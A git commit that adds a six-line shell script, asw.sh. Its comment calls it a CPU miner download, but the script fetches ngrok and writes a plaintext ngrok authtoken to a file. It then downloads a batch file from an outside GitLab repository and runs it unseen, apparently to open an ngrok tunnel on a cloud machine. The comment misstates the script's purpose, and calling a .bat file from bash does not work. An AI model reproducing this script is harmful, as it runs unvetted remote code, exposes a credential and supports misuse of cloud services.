6022be608c6bc0aaf13d5d98cb63fd2c64252703
newstore0077 <91786879+newstore0077@users.noreply.github.com>
2022-02-25 01:13:58 +0700

    Create asw.sh

---
+++ asw.sh
@@ -0,0 +1,6 @@
+# Donwload CPU Miner (SUGAR)
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz
+tar xf ngrok-stable-linux-amd64.tgz
+echo ngrok authtoken "7yGZV6RYigyyxELWQpcqC_5s12pohsvoWJwFVMmMHwU" > NGROK.bat
+curl -s -O https://gitlab.com/haithuongpro2711/haivps/-/raw/master/AzureNgrokAutoRegion.bat
+AzureNgrokAutoRegion.bat
